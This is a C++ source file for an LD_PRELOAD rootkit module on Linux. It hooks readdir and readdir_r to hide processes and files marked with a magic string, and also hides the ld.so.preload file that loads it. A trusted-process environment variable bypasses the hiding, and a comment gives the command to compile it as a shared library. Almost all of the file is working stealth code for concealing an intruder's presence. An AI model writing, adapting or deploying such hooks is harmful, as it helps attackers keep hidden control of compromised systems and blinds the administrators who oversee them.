
#include "main.h"
// Wl is gcc option to pass the parameters to the linker
// gcc -static-libgcc -static-libstdc++ -shared -ldl -lstdc++ -fPIC main.cpp -o main.so


/*
* /proc/$PID/comm - process name
* /proc/$PID/cmdline - cmd line without whitespaces
* To specify proper process we will add UUID number as one of cmdline argument
*/

bool checkEntry (dirent * dirPtr) {
	CErrnoSaver svErr;
	std::string name (dirPtr->d_name);
	descr_holder fd (new int (-1));
	int tmp;
	const int bufSz = 256;
	char tmpBuf [bufSz], *chPtr, chData;
	

	// To check if the caller is our trust process
	if ((chPtr = getenv (envShowName)) && !strcmp (chPtr, envShowValue)) return true;
	

	if (-1 == (*fd = open (("/proc/" + name + "/cmdline").c_str (), O_RDONLY))) {
		// this is not a process
		// Is this a ld.so.preload ?
		if (strstr (dirPtr->d_name, prelFileNameClear) != NULL) {
			descr_holder fd1 (new int (-1));
			*fd1 = open (dynCnfFile.c_str (), O_RDONLY);
			while ((tmp = read (*fd1, &chData, 1)) == -1 && errno == EINTR);
			// if we can't read config, we think that preload file doesn't exist
			if (tmp == -1) return false;
			if (chData == '1') return true;
			else false;
		}
		// Is this our directory ?
		if (NULL == strstr (dirPtr->d_name, MAGIC_STRING)) {
			// we don't want to hide this file/directory
			return true;
		}
		return false;
	}
	
	do {
		tmp = read (*fd, tmpBuf, bufSz - 1);
		if (-1 == tmp && errno == EINTR) continue;
		else if (-1 == tmp) return true;
		
		// remove null-terminators
		for (int i = 0; i < tmp; ++i) if (tmpBuf[i] == '\0') tmpBuf[i] = '_';
		tmpBuf[tmp] = '\0';
		
		if (NULL == strstr (&tmpBuf[0], MAGIC_STRING)) return true;
		return false;
	} while (true);
	
	
	return true;
}

struct dirent *readdir(DIR *dirp)
{
	dirent *tmp;
	RDDR f_ptr = (RDDR)dlsym (RTLD_NEXT, "readdir");
	
	assert (f_ptr != NULL);
	
	while (tmp = f_ptr (dirp)) {
		if (checkEntry (tmp)) return tmp;
	}
	
	return NULL;
}

int readdir_r(DIR *dirp, struct dirent *entry, struct dirent **result)
{
	dirent **dPtr;
	int ret;
	RDDR_R f_ptr = (RDDR_R)dlsym (RTLD_NEXT, "readdir_r");
	
	assert (f_ptr != NULL);
	
	while (true) {
		if ((ret = f_ptr (dirp, entry, result)) != 0) return ret;
		if (*result == NULL) return 0;
		if (checkEntry (entry)) return 0;
	}
}















